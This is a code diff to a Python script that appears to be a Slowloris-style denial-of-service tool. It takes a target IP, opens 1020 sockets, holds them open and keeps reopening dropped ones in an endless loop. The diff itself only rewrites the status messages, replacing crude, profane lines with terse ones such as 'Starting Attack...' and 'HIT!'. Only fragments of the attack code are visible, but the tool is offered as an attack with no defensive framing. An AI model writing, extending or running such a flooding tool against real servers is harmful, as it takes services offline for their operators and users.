@@ -27,7 +27,7 @@ if __name__ == "__main__":
 
     ip = sys.argv[1]
     count = 1020
-    print("Jizzing on {}'s servers. Connecting to {} sockets.".format(ip, count))
+    print("Starting Attack...")
 
     for _ in range(count):
         try:
@@ -39,7 +39,7 @@ if __name__ == "__main__":
         sockets.append(sock)
 
     while True:
-        print("Connected to {} sockets. Really killing it now...".format(len(sockets)))
+        print("Connected {} sockets".format(len(sockets)))
 
         for sock in list(sockets):
             try:
@@ -48,7 +48,7 @@ if __name__ == "__main__":
                 sockets.remove(sock)
 
         for _ in range(count - len(sockets)):
-            print("Fucking it up more, reopening sockets...")
+            print("HIT!")
             try:
                 sock = setupSocket(ip)
                 if sock:
